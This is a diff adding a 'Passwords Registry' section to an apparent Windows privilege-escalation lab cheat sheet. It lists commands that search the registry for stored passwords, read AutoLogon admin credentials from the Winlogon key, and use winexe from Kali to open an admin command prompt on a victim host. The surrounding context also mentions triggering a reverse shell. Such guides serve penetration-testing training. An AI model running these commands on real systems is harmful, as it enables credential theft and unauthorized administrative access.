@@ -17,6 +17,7 @@ Windows Privilege Escalation by @nickvourd
 - [Token Manipulation](#token-manipulation)
 - [Autologon User Credentials](#autologon-user-credentials)
 - [Autoruns](#autoruns)
+- [Passwords Registy](#passwords-registry)
 - User Account Control (UAC) Bypass
 - Insecure Named Pipes Permissions
 
@@ -322,3 +323,14 @@ Windows stores all the necessary data that is related to services in the registr
 * Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it.
 
   * rdesktop \<ip>
+  
+ # Passwords Registry
+ 
+ * The registry can be searched for keys and values that contain the word "password":
+   * reg query HKLM /f password /t REG_SZ /s
+
+* If you want to save some time, query this specific key to find admin AutoLogon credentials:
+   * reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+   
+* On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
+   * winexe -U 'admin%password' //ip_of_victim cmd.exe
